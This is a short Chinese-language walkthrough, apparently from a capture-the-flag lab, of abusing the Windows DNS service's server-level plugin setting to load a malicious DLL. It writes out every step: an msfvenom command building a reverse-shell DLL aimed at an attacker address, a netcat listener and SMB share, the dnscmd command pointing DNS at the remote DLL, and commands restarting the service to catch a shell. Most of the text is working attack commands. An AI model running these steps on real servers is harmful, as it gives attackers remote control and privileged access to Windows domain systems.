这个是利用DNS的服务将我们创建的DLL文件作为插件进行加载，

首先创建一个我们要进行利用的DLL

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.8 LPORT=12345 -f dll -o rev.dll
```

第二步我们在攻击端开启服务侦听，在保存了rev.dll的目录下

```
sudo nc -nvlp 12345
sudo impacket-smbserver share . -smb2support
```

第三步加载相应的攻击

```
dnscmd.exe /config /serverlevelplugindll \\10.10.16.8\share\rev.dll
```

![image-20241029212640340](https://s2.loli.net/2024/10/29/hc95uIFpEn2yOs3.png)

第四步重新启动dns服务

```
sc.exe \\resolute stop dns
sc.exe \\resolute start dns
```

这样就能在nc获得一个链接
